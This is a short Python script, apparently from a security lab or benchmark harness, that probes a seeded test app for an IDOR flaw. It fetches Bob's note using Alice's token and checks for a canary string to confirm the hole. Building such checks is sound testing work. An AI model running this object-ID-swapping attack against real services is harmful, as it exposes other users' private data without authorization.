import requests

EXPECTED_CANARY = "BOB_SECRET_123"


def attack_idor(base_url):
    session_alice = requests.Session()
    # Matches target/seed.py: (1, "alice", "alice-token")
    session_alice.headers.update({"X-Token": "alice-token"})

    # Note 2 belongs to Bob: (2, 2, "Bob's note", "BOB_SECRET_123")
    target_url = f"{base_url}/notes/2"
    req_info = {
        "method": "GET",
        "url": target_url,
        "headers": {"X-Token": "alice-token"},
    }

    try:
        alice_res = session_alice.get(target_url, timeout=3)
        resp_info = {"status": alice_res.status_code, "body": alice_res.text}

        # Confirmed if Alice receives 200 OK and Bob's note body is returned
        confirmed = (alice_res.status_code == 200) and (
            EXPECTED_CANARY in alice_res.text
        )

        return {
            "confirmed": confirmed,
            "request": req_info,
            "response": resp_info,
        }
    except Exception as e:
        return {
            "confirmed": False,
            "request": {"error": str(e)},
            "response": {},
        }